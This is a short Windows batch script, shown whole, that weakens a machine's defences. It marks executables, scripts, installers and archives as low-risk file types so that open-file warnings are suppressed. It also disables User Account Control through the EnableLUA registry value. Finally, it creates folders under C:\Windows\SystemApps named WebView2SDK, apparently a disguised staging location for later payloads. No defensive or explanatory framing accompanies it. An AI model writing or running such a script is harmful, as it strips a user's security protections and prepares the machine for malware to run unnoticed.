@echo off
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" /f /t REG_SZ /v "LowRiskFileTypes" /d ".avi;.bat;.cmd;.exe;.htm;.html;.lnk;.mpg;.mpeg;.mov;.mp3;.mp4;.mkv;.msi;.m3u;.rar;.reg;.txt;.vbs;.wav;.zip;.7z."
reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
if not exist "C:\Windows\SystemApps\Shared" mkdir "C:\Windows\SystemApps\Shared"
if not exist "C:\Windows\SystemApps\Shared\WebView2SDK" mkdir "C:\Windows\SystemApps\Shared\WebView2SDK"
exit
